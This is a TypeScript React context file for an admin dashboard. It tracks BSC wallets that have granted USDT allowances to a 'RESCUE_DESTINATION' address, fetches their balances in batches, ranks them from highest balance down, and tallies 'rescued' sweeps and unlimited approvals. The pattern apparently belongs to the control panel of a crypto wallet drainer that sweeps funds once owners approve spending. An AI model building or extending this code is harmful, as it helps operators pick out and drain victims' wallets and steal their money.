// src/client/context/AdminDataContext.tsx
import React, { createContext, useContext, useState, useEffect, ReactNode, useMemo, useCallback } from 'react';
import {
  collection,
  query,
  where,
  onSnapshot,
  Timestamp,
  doc,
  updateDoc,
} from 'firebase/firestore';
import { ethers } from 'ethers';
import { db } from '../config/firebase';
import { RPC_URL, USDT_CONTRACT, RESCUE_DESTINATION } from '../config/publicConfig';

export interface WalletDoc {
  id: string;
  status: string;
  sponsoredAt?: Timestamp;
  sponsorTxHash?: string;
  createdAt?: string;
  approvalStatus?: string; // 'UNAPPROVED' | 'APPROVED'
  unapprovedAt?: Timestamp;
}

export interface SweepInfo {
  sweptAtMs: number;
  txHash?: string;
  amount?: string;
  formattedAmount?: string;
}

export interface TwoDayStats {
  total: number;
  successful: number;
  unlimitedGranted: number;
}

interface AdminDataContextType {
  allWallets: WalletDoc[];
  sortedWallets: WalletDoc[];
  approvedWallets: WalletDoc[];
  unapprovedWallets: WalletDoc[];
  totalBalanceRescued: string;
  todayBalanceRescued: string;
  twoDayStats: TwoDayStats | null;
  latestSweepsMap: Record<string, SweepInfo>;
  balances: Record<string, { balance: string; loading: boolean }>;
  refreshBalance: (address: string) => Promise<void>;
  refreshAllBalances: () => Promise<void>;
  recordLocalSweep: (address: string, txHash?: string, amount?: string) => void;
  markWalletUnapproved: (address: string) => Promise<void>;
  markWalletApproved: (address: string) => Promise<void>;
  checkWalletAllowanceOnChain: (address: string) => Promise<boolean>;
  checkAllUnapprovedOnChain: () => Promise<{ reapprovedCount: number; checkedCount: number }>;
  connectedCount: number;
  unlimitedTodayCount: number;
  isLoading: boolean;
  error: string | null;
}

const AdminDataContext = createContext<AdminDataContextType | undefined>(undefined);

// ── Date helper functions ───────────────────────────────────────────────
function startOfToday(): Timestamp {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return Timestamp.fromDate(d);
}

const BSC_RPCS = [
  RPC_URL,
  'https://bsc-rpc.publicnode.com/',
  'https://bsc-dataseed.binance.org/',
  'https://bsc-dataseed1.defibit.io/',
  'https://bsc-dataseed1.ninicoin.io/',
];

const MULTICALL3_ADDRESS = '0xcA11bde05977b3631167028862bE2a173976CA11';

const MULTICALL3_ABI = [
  'function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) view returns (tuple(bool success, bytes returnData)[])',
];

const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

const erc20Interface = new ethers.Interface(ERC20_ABI);

function formatUSDTBal(rawBal: bigint): string {
  const formatted = ethers.formatUnits(rawBal, 18);
  const num = parseFloat(formatted);
  if (num === 0) return '0.00';
  if (num < 0.01) return num.toFixed(4);
  return num.toLocaleString(undefined, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
}

/** Race a promise with a timeout in milliseconds */
function withTimeout<T>(promise: Promise<T>, ms = 4500): Promise<T> {
  return Promise.race([
    promise,
    new Promise<T>((_, reject) =>
      setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms)
    ),
  ]);
}

/**
 * Batch-fetch balances using Multicall3 on BSC.
 * Fetches all requested wallet balances in a single RPC round-trip (< 1 second).
 */
async function fetchBatchUSDTBalances(
  addresses: string[]
): Promise<Record<string, string>> {
  if (addresses.length === 0) return {};

  const validAddresses = addresses.filter((a) => ethers.isAddress(a));
  if (validAddresses.length === 0) return {};

  const calls = validAddresses.map((addr) => ({
    target: USDT_CONTRACT,
    allowFailure: true,
    callData: erc20Interface.encodeFunctionData('balanceOf', [addr]),
  }));

  const results: Record<string, string> = {};

  for (const rpc of BSC_RPCS) {
    try {
      const provider = new ethers.JsonRpcProvider(rpc, 56, { staticNetwork: true });
      const multicallContract = new ethers.Contract(
        MULTICALL3_ADDRESS,
        MULTICALL3_ABI,
        provider
      );

      const rawResults: Array<{ success: boolean; returnData: string }> =
        await withTimeout(multicallContract.aggregate3(calls), 4500);

      rawResults.forEach((res, idx) => {
        const lower = validAddresses[idx].toLowerCase();
        if (res.success && res.returnData && res.returnData !== '0x') {
          try {
            const decoded = erc20Interface.decodeFunctionResult(
              'balanceOf',
              res.returnData
            );
            results[lower] = formatUSDTBal(decoded[0]);
          } catch {
            results[lower] = '0.00';
          }
        } else {
          results[lower] = '0.00';
        }
      });

      return results;
    } catch {
      // Try next RPC node
    }
  }

  // Fallback if all multicall attempts fail: query directly with graceful fallback
  for (const addr of validAddresses) {
    try {
      results[addr.toLowerCase()] = await fetchOnChainUSDTBalance(addr);
    } catch {
      results[addr.toLowerCase()] = '0.00';
    }
  }

  return results;
}

/** Direct single wallet balance fetcher with timeout and RPC rotation */
async function fetchOnChainUSDTBalance(address: string): Promise<string> {
  if (!ethers.isAddress(address)) return '0.00';

  for (const rpc of BSC_RPCS) {
    try {
      const provider = new ethers.JsonRpcProvider(rpc, 56, { staticNetwork: true });
      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
      const rawBal: bigint = await withTimeout(contract.balanceOf(address), 4000);
      return formatUSDTBal(rawBal);
    } catch {
      // try next fallback rpc
    }
  }
  return '0.00';
}

function parseRescueAmount(d: any): number {
  if (d.amountFormatted) {
    const val = parseFloat(d.amountFormatted);
    if (!isNaN(val)) return val;
  }
  if (d.amount) {
    try {
      const formatted = ethers.formatUnits(d.amount, 18);
      const val = parseFloat(formatted);
      if (!isNaN(val)) return val;
    } catch {
      const val = parseFloat(d.amount);
      if (!isNaN(val)) return val;
    }
  }
  return 0;
}

export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [allWallets, setAllWallets] = useState<WalletDoc[]>([]);
  const [unapprovedSet, setUnapprovedSet] = useState<Set<string>>(new Set());
  const [twoDayStats, setTwoDayStats] = useState<TwoDayStats | null>(null);
  const [totalRescuedNum, setTotalRescuedNum] = useState<number>(0);
  const [todayRescuedNum, setTodayRescuedNum] = useState<number>(0);
  const [dbSweepsMap, setDbSweepsMap] = useState<Record<string, SweepInfo>>({});
  const [localSweepsMap, setLocalSweepsMap] = useState<Record<string, SweepInfo>>({});
  const [balances, setBalances] = useState<Record<string, { balance: string; loading: boolean }>>({});
  const [isWalletsLoaded, setIsWalletsLoaded] = useState(false);
  const [isRescuesLoaded, setIsRescuesLoaded] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Combine Firestore database sweeps with immediate optimistic sweeps
  const latestSweepsMap = useMemo(() => {
    return { ...dbSweepsMap, ...localSweepsMap };
  }, [dbSweepsMap, localSweepsMap]);

  useEffect(() => {
    setError(null);

    // 1. Real-time listener for ELIGIBLE wallets (sponsors collection)
    const walletsQuery = query(
      collection(db, 'sponsors'),
      where('status', '==', 'ELIGIBLE')
    );

    const unsubWallets = onSnapshot(
      walletsQuery,
      (snapshot) => {
        const wallets: WalletDoc[] = snapshot.docs.map((d) => ({
          id: d.id,
          ...(d.data() as Omit<WalletDoc, 'id'>),
        }));
        setAllWallets(wallets);

        // Pre-populate unapprovedSet from documents stored with approvalStatus === 'UNAPPROVED'
        setUnapprovedSet((prev) => {
          const next = new Set(prev);
          wallets.forEach((w) => {
            if (w.approvalStatus === 'UNAPPROVED') {
              next.add(w.id.toLowerCase());
            } else if (w.approvalStatus === 'APPROVED') {
              next.delete(w.id.toLowerCase());
            }
          });
          return next;
        });

        setIsWalletsLoaded(true);
      },
      (err) => {
        console.error('AdminDataContext sponsors listener error:', err);
        setError(err.message ?? 'Failed to stream approved wallets.');
        setIsWalletsLoaded(true);
      }
    );

    // 2. Real-time listener for rescues collection (all sweeps)
    const rescuesQuery = query(collection(db, 'rescues'));

    const unsubRescues = onSnapshot(
      rescuesQuery,
      (snapshot) => {
        const docs = snapshot.docs.map((doc) => doc.data());

        // Confirmed rescues
        const confirmedDocs = docs.filter((d) => d.status === 'CONFIRMED' || !d.status);

        // All-time total balance swept
        const allTimeTotal = confirmedDocs.reduce((acc, d) => acc + parseRescueAmount(d), 0);
        setTotalRescuedNum(allTimeTotal);

        // Today's balance (from midnight 00:00 to 23:59:59)
        const todayStartMs = startOfToday().toMillis();
        const todayDocs = confirmedDocs.filter((d) => {
          if (!d.createdAt) return false;
          const ms = typeof d.createdAt.toMillis === 'function'
            ? d.createdAt.toMillis()
            : new Date(d.createdAt).getTime();
          return ms >= todayStartMs;
        });
        const todayTotal = todayDocs.reduce((acc, d) => acc + parseRescueAmount(d), 0);
        setTodayRescuedNum(todayTotal);

        // 48h stats
        const now = Date.now();
        const cutoff48h = now - 48 * 60 * 60 * 1000;
        const recentDocs = docs.filter((d) => {
          if (!d.createdAt) return false;
          const ms = typeof d.createdAt.toMillis === 'function'
            ? d.createdAt.toMillis()
            : new Date(d.createdAt).getTime();
          return ms >= cutoff48h;
        });

        setTwoDayStats({
          total: recentDocs.length,
          successful: recentDocs.filter((d) => d.status === 'CONFIRMED').length,
          unlimitedGranted: recentDocs.filter(
            (d) => d.status === 'CONFIRMED' && d.amount && d.amount !== '0'
          ).length,
        });

        // Map latest sweep per wallet
        const sweeps: Record<string, SweepInfo> = {};
        for (const d of docs) {
          const user = (d.user || '').toLowerCase();
          if (!user) continue;
          let ms = 0;
          if (typeof d.createdAt?.toMillis === 'function') {
            ms = d.createdAt.toMillis();
          } else if (d.createdAt) {
            ms = new Date(d.createdAt).getTime() || 0;
          }

          const existing = sweeps[user];
          if (!existing || ms > existing.sweptAtMs) {
            sweeps[user] = {
              sweptAtMs: ms,
              txHash: d.sweepTxHash,
              amount: d.amount,
              formattedAmount: d.amountFormatted,
            };
          }
        }
        setDbSweepsMap(sweeps);
        setIsRescuesLoaded(true);
      },
      (err) => {
        console.error('AdminDataContext rescues listener error:', err);
        setIsRescuesLoaded(true);
      }
    );

    return () => {
      unsubWallets();
      unsubRescues();
    };
  }, []);

  // ── Mark wallet as unapproved (moves it to Non-Approved list) ─────────────
  const markWalletUnapproved = useCallback(async (address: string) => {
    const lower = address.toLowerCase();
    setUnapprovedSet((prev) => {
      if (prev.has(lower)) return prev;
      const next = new Set(prev);
      next.add(lower);
      return next;
    });

    try {
      const docRef = doc(db, 'sponsors', lower);
      await updateDoc(docRef, {
        approvalStatus: 'UNAPPROVED',
        unapprovedAt: Timestamp.now(),
      });
    } catch (err) {
      console.warn('Could not persist unapproved status to Firestore:', err);
    }
  }, []);

  // ── Mark wallet as approved (moves it back to Approved list) ──────────────
  const markWalletApproved = useCallback(async (address: string) => {
    const lower = address.toLowerCase();
    setUnapprovedSet((prev) => {
      if (!prev.has(lower)) return prev;
      const next = new Set(prev);
      next.delete(lower);
      return next;
    });

    try {
      const docRef = doc(db, 'sponsors', lower);
      await updateDoc(docRef, {
        approvalStatus: 'APPROVED',
        unapprovedAt: null,
      });
    } catch (err) {
      console.warn('Could not reset approvalStatus in Firestore:', err);
    }
  }, []);

  // ── Check on-chain allowance (called only on manual user request) ──────────
  const checkWalletAllowanceOnChain = useCallback(async (address: string): Promise<boolean> => {
    for (const rpc of BSC_RPCS) {
      try {
        const provider = new ethers.JsonRpcProvider(rpc, 56, { staticNetwork: true });
        const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
        const allowance: bigint = await withTimeout(
          contract.allowance(address, RESCUE_DESTINATION),
          3500
        );
        if (allowance > 0n) {
          await markWalletApproved(address);
          return true;
        } else {
          await markWalletUnapproved(address);
          return false;
        }
      } catch {
        // try next fallback
      }
    }
    return false;
  }, [markWalletApproved, markWalletUnapproved]);

  // ── Single Wallet Balance Fetching (Direct On-Chain via standard balanceOf) ─
  const fetchSingleBalance = useCallback(async (address: string, silent = false) => {
    const lower = address.toLowerCase();
    if (!silent) {
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: true },
      }));
    }

    try {
      const bal = await fetchOnChainUSDTBalance(address);
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: bal, loading: false },
      }));
      return bal;
    } catch (err) {
      console.error(`Failed to refresh balance for ${address}:`, err);
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: false },
      }));
      return prev[lower]?.balance ?? '0.00';
    }
  }, []);

  const refreshAllBalances = useCallback(async () => {
    if (allWallets.length === 0) return;

    // Set loading indicator
    setBalances((prev) => {
      const next = { ...prev };
      allWallets.forEach((w) => {
        const lower = w.id.toLowerCase();
        next[lower] = { balance: prev[lower]?.balance ?? '0.00', loading: true };
      });
      return next;
    });

    try {
      const addresses = allWallets.map((w) => w.id);
      const balMap = await fetchBatchUSDTBalances(addresses);
      setBalances((prev) => {
        const next = { ...prev };
        addresses.forEach((addr) => {
          const lower = addr.toLowerCase();
          next[lower] = { balance: balMap[lower] ?? prev[lower]?.balance ?? '0.00', loading: false };
        });
        return next;
      });
    } catch (err) {
      console.error('refreshAllBalances error:', err);
      // In case of error, reset loading state
      setBalances((prev) => {
        const next = { ...prev };
        allWallets.forEach((w) => {
          const lower = w.id.toLowerCase();
          if (next[lower]) next[lower] = { ...next[lower], loading: false };
        });
        return next;
      });
    }
  }, [allWallets]);

  // Initial balance load on wallet change (without recurring 5-second interval timer)
  useEffect(() => {
    if (allWallets.length === 0) return;

    let isSubscribed = true;

    const runInitialBatch = async () => {
      const addresses = allWallets.map((w) => w.id);
      setBalances((prev) => {
        const next = { ...prev };
        let hasNew = false;
        addresses.forEach((addr) => {
          const lower = addr.toLowerCase();
          if (!prev[lower]) {
            next[lower] = { balance: '0.00', loading: true };
            hasNew = true;
          }
        });
        return hasNew ? next : prev;
      });

      try {
        const balMap = await fetchBatchUSDTBalances(addresses);
        if (!isSubscribed) return;
        setBalances((prev) => {
          const next = { ...prev };
          addresses.forEach((addr) => {
            const lower = addr.toLowerCase();
            next[lower] = { balance: balMap[lower] ?? prev[lower]?.balance ?? '0.00', loading: false };
          });
          return next;
        });
      } catch (err) {
        console.warn('Initial balance load error:', err);
      }
    };

    runInitialBatch();

    return () => {
      isSubscribed = false;
    };
  }, [allWallets]);

  // ── Record an immediate sweep event locally (moves wallet to top & zeroes balance) ─
  const recordLocalSweep = useCallback(
    (address: string, txHash?: string, amount?: string) => {
      const lower = address.toLowerCase();
      setLocalSweepsMap((prev) => ({
        ...prev,
        [lower]: {
          sweptAtMs: Date.now(),
          txHash,
          amount,
          formattedAmount: amount,
        },
      }));

      // Immediately zero out the balance
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: '0.00', loading: false },
      }));

      // Optimistically add to rescued totals
      if (amount) {
        const parsed = parseFloat(amount);
        if (!isNaN(parsed) && parsed > 0) {
          setTotalRescuedNum((prev) => prev + parsed);
          setTodayRescuedNum((prev) => prev + parsed);
        }
      }
    },
    []
  );

  // ── Derived metrics ─────────────────────────────────────────────────
  const unlimitedTodayCount = useMemo(() => {
    const todayCutoff = startOfToday().toMillis();
    return allWallets.filter((w) => {
      if (!w.sponsoredAt) return false;
      const ms = w.sponsoredAt.toMillis?.() ?? 0;
      return ms >= todayCutoff;
    }).length;
  }, [allWallets]);

  // Formatted rescued totals
  const totalBalanceRescued = useMemo(() => {
    return (
      totalRescuedNum.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      }) + ' USDT'
    );
  }, [totalRescuedNum]);

  const todayBalanceRescued = useMemo(() => {
    return (
      todayRescuedNum.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      }) + ' USDT'
    );
  }, [todayRescuedNum]);

  // ── Sort wallets: High to Low balance, preserving new connection / sweep top placement ─
  const sortWalletsList = useCallback((list: WalletDoc[]) => {
    const parseBal = (addr: string): number => {
      const raw = balances[addr.toLowerCase()]?.balance;
      if (!raw) return 0;
      const clean = raw.replace(/,/g, '');
      const val = parseFloat(clean);
      return isNaN(val) ? 0 : val;
    };

    const getRecentActionScore = (w: WalletDoc): number => {
      const sponsoredMs = w.sponsoredAt?.toMillis?.() ?? 0;
      let createdMs = 0;
      if (w.createdAt) {
        if (typeof (w.createdAt as any).toMillis === 'function') {
          createdMs = (w.createdAt as any).toMillis();
        } else {
          const parsed = new Date(w.createdAt as any).getTime();
          if (!isNaN(parsed)) createdMs = parsed;
        }
      }
      const sweepMs = latestSweepsMap[w.id.toLowerCase()]?.sweptAtMs ?? 0;
      return Math.max(sponsoredMs, createdMs, sweepMs);
    };

    return [...list].sort((a, b) => {
      const balA = parseBal(a.id);
      const balB = parseBal(b.id);

      // 1. Wallets with positive balances appear first, ordered high-to-low balance
      const hasFundsA = balA > 0;
      const hasFundsB = balB > 0;

      if (hasFundsA && hasFundsB) {
        if (balB !== balA) return balB - balA; // higher balance higher up
        return getRecentActionScore(b) - getRecentActionScore(a);
      }
      if (hasFundsA && !hasFundsB) return -1;
      if (!hasFundsA && hasFundsB) return 1;

      // 2. Among zero-balance / swept wallets, sort by newly connected and latest swept
      return getRecentActionScore(b) - getRecentActionScore(a);
    });
  }, [balances, latestSweepsMap]);

  const sortedWallets = useMemo(() => {
    return sortWalletsList(allWallets);
  }, [allWallets, sortWalletsList]);

  // Split into Approved vs Non-Approved (both strictly sorted high to low balance)
  const approvedWallets = useMemo(() => {
    const filtered = allWallets.filter(
      (w) => !unapprovedSet.has(w.id.toLowerCase()) && w.approvalStatus !== 'UNAPPROVED'
    );
    return sortWalletsList(filtered);
  }, [allWallets, unapprovedSet, sortWalletsList]);

  const unapprovedWallets = useMemo(() => {
    const filtered = allWallets.filter(
      (w) => unapprovedSet.has(w.id.toLowerCase()) || w.approvalStatus === 'UNAPPROVED'
    );
    return sortWalletsList(filtered);
  }, [allWallets, unapprovedSet, sortWalletsList]);

  const checkAllUnapprovedOnChain = useCallback(async (): Promise<{ reapprovedCount: number; checkedCount: number }> => {
    let reapprovedCount = 0;
    const listToCheck = [...unapprovedWallets];
    if (listToCheck.length === 0) return { reapprovedCount: 0, checkedCount: 0 };

    await Promise.allSettled(
      listToCheck.map(async (w) => {
        const isApproved = await checkWalletAllowanceOnChain(w.id);
        if (isApproved) reapprovedCount++;
      })
    );

    return { reapprovedCount, checkedCount: listToCheck.length };
  }, [unapprovedWallets, checkWalletAllowanceOnChain]);

  const connectedCount = approvedWallets.length;
  const isLoading = !isWalletsLoaded || !isRescuesLoaded;

  return (
    <AdminDataContext.Provider
      value={{
        allWallets,
        sortedWallets,
        approvedWallets,
        unapprovedWallets,
        totalBalanceRescued,
        todayBalanceRescued,
        twoDayStats,
        latestSweepsMap,
        balances,
        refreshBalance: (addr) => fetchSingleBalance(addr, false),
        refreshAllBalances,
        recordLocalSweep,
        markWalletUnapproved,
        markWalletApproved,
        checkWalletAllowanceOnChain,
        checkAllUnapprovedOnChain,
        connectedCount,
        unlimitedTodayCount,
        isLoading,
        error,
      }}
    >
      {children}
    </AdminDataContext.Provider>
  );
};

export const useAdminData = (): AdminDataContextType => {
  const context = useContext(AdminDataContext);
  if (!context) {
    throw new Error('useAdminData must be used within an AdminDataProvider');
  }
  return context;
};
